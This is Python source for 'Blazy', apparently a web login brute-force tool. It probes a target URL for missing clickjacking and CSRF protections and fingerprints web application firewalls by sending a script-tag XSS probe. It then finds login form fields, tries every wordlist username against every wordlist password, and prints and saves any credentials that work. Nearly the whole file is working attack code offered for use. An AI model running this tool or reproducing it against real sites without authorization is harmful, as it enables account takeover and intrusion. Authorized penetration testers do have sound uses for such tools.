import sys
from datetime import datetime
from re import search
from urllib.request import urlopen

from bs4 import BeautifulSoup

from core.browser import BlazyBrowser
from core.colors import RED, BOLD, WHITE, GREEN, END, YELLOW, BLUE
from core.constants import BASE_OUTPUT_PATH
from core.utils import print_data, can_not_use_brute_force, wordlist_u, wordlist_p, save_data


class Blazy:
    def __init__(self, url: str, verbose: bool = False,
                 usernames: list[str] = None, passwords: list[str] = None,
                 username_file: str = None, passwords_file: str = None, scan_all: bool = False):
        self.browser = BlazyBrowser()
        if 'http://' in url:
            self.scan_url = url
        elif 'https://' in url:
            self.scan_url = url.replace('https://', 'http://')
        else:
            self.scan_url = f'http://{url}'

        self.results = []
        self.extra = []

        self.verbose = verbose
        self.all = scan_all

        self.usernames = usernames or wordlist_u(username_file)
        self.log(f'{WHITE}[>]{BOLD} Usernames loaded: {len(self.usernames)}')
        self.passwords = passwords or wordlist_p(passwords_file)
        self.log(f'{WHITE}[>]{BOLD} Passwords loaded: {len(self.passwords)}')

        self.original_contest = ''

    def run_scan(self):
        self.log(f'Target url: {self.scan_url}')  # Opens the url
        forms = self.browser.get_forms(self.scan_url)  # Finds all the forms present in webpage
        headers = str(urlopen(self.scan_url).headers).lower()  # Fetches headers of webpage
        if 'x-frame-options:' not in headers:
            print(f'{GREEN}[+]{END} Heuristic found a Clickjacking Vulnerability')
            self.extra.append('Heuristic found a Clickjacking Vulnerability')
        if 'cloudflare-nginx' in headers:
            print(f'{RED}[-]{END} Target is protected by Cloudflare')
            self.extra.append('Target is protected by Cloudflare')
        data = self.browser.get_data(self.scan_url)  # Reads the response
        if 'type="hidden"' not in data:
            print(f'{GREEN}[+]{END} Heuristic found a CSRF Vulnerability')
            self.extra.append('Heuristic found a CSRF Vulnerability')

        soup = BeautifulSoup(data, 'lxml')  # Pareses the response with beautiful soup
        i_title = soup.find('title')  # finds the title tag
        if i_title is not None:
            self.original_contest = i_title.contents  # value of title tag is assigned to 'original'

        self.waf_detector()
        self.find(forms=forms)

    def waf_detector(self):
        res1 = urlopen(f"{self.scan_url}?=<script>alert()</script>")
        match res1.code:
            case 406 | 501:
                print(f"{RED}[-]{BOLD} WAF Detected : Mod_Security")
                self.extra.append('WAF Detected : Mod_Security')
            case 999:
                print(f"{RED}[-]{BOLD} WAF Detected : WebKnight")
                self.extra.append('WAF Detected : WebKnight')
            case 419:
                print(f"{RED}[-]{BOLD} WAF Detected : F5 BIG IP")
                self.extra.append('WAF Detected : F5 BIG IP')
            case 403:
                print(f"{RED}[-]{BOLD} Unknown WAF Detected")
                self.extra.append('Unknown WAF Detected. Response code is 403')
            case _:
                pass

    def find(self, forms: list):  # Function for finding forms
        if not forms:
            print(f'{RED}[-]{END} No forms found')
            return
        print(f'{GREEN}[+]{END} Found {len(forms)} forms')
        for form_number, form in enumerate(forms):  # Finds all the forms in the webpage
            form_data = str(form)  # Converts the response received to string
            if username := search(r'<TextControl\([^<]*=\)>', form_data):
                username = username.group().split('<TextControl(')[1][:-3]  # Extract the name of field
                self.log(f'{YELLOW}[!]{END} Username field: {username}')
                if passwd_input := search(r'<PasswordControl\([^<]*=\)>', form_data):
                    passwd_input = passwd_input.group().split('<PasswordControl(')[1][:-3]  # Extracts the field name
                    self.log(f'{YELLOW}[!]{END} Password field: {passwd_input}')
                    menu = False  # No menu is present in the form
                    options = ['']
                    form_name = ""
                    if select_controls := search(r'SelectControl\([^<]*=', form_data):
                        form_name = select_controls.group().split('(')[1][:-1]  # Extracts the menu name
                        if select_o := search(r'SelectControl\([^<]*=[^<]*\)>', form_data):
                            menu = True  # Sets the menu to be true
                            options = (select_o.group().split('=')[1][:-1])  # Extracts options
                            text = f'\n{YELLOW}[!]{END} A drop down menu detected.' \
                                   f'\n{YELLOW}[!]{END} Menu name: {form_name}' \
                                   f'\n{YELLOW}[!]{END} Options available: {options}'
                            print(text)
                            self.extra.append(text)
                            if not self.all:
                                options = [input(f'{BLUE}[?]{END} Please Select an option:>> ')]
                    try:
                        self.run_brute(username_input=username, passwd_input=passwd_input, menu=menu, options=options,
                                       form_name=form_name, form_number=form_number)
                    except Exception as exc:
                        can_not_use_brute_force(username, exc)

    def run_brute(self, username_input: str, passwd_input: str, menu: bool, options: list, form_name: str,
                  form_number: int):
        start_time = datetime.now()
        self.log(f'{RED}[-]{END} Bruteforce started: {start_time}')
        self.brute(username_input=username_input, passwd_input=passwd_input, menu=menu, options=options,
                   form_name=form_name, form_number=form_number)
        end_time = datetime.now()
        self.log(f'{RED}[-]{END} Bruteforce finished: {end_time}. Total: {end_time - start_time}')

    def brute(self, username_input: str, passwd_input: str, menu: bool, options: list,
              form_name: str, form_number: int):
        for uname in iter(self.usernames):  # with iter run faster
            self.log(f'{WHITE}[>]{BOLD} Brute forcing username: {uname}')
            for iter_num, password in enumerate(self.passwords, 1):
                if self.verbose:
                    message = f'\r{WHITE}[>]{BOLD} Passwords tried: {iter_num} / {len(self.passwords)}'
                    sys.stdout.write(message)
                    sys.stdout.flush()
                for option in options:
                    form_data = self.browser.process_form(url=self.scan_url, form_number=form_number,
                                                          username_input=username_input, passwd_input=passwd_input,
                                                          form_name=form_name, username=uname, password=password,
                                                          option=option, menu=menu)
                    data_low = form_data.lower()
                    if 'username or password' not in data_low:
                        new_title = BeautifulSoup(form_data, 'lxml').find('title')
                        if new_title is None and 'logout' in data_low \
                                or new_title is not None and self.original_contest != new_title.contents:
                            print(f'\n{GREEN}[+]{END} Valid credentials found:'
                                  f'\n{GREEN}Username:{END} {uname}'
                                  f'\n{GREEN}Password:{END} {password}')
                            self.results.append({
                                'username': uname,
                                'related_username_form': username_input,
                                'password': password,
                                'related_password_form': passwd_input,
                                'target_url': self.scan_url,
                            })
                            if not self.all:
                                return

    def save_results(self, output: str = BASE_OUTPUT_PATH):
        self.log(f'Saving data into {output}')
        data = {
            "url": self.scan_url,
            'findings': self.results,
            'extra': self.extra,
        }
        save_data(data=data, file_path=output)

    def log(self, message: str):
        print_data(message, verbose=self.verbose)
